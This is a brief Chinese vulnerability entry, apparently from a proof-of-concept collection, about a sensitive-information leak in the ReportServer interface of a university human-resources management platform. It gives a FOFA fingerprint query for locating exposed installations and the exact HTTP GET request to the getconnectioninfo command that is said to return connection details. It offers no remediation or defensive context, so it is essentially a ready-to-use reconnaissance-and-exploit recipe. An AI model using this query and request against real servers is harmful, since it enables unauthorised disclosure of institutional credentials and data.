## 影响版本

高校人力资源管理服务平台系统

高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露漏洞

## 4.fofa查询语句

body="FM_SYS_ID"||body="product/recruit/website/RecruitIndex.jsp"

## 5.漏洞复现

漏洞链接：https://xx.xx.xx.xx/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo

漏洞数据包：

```
GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

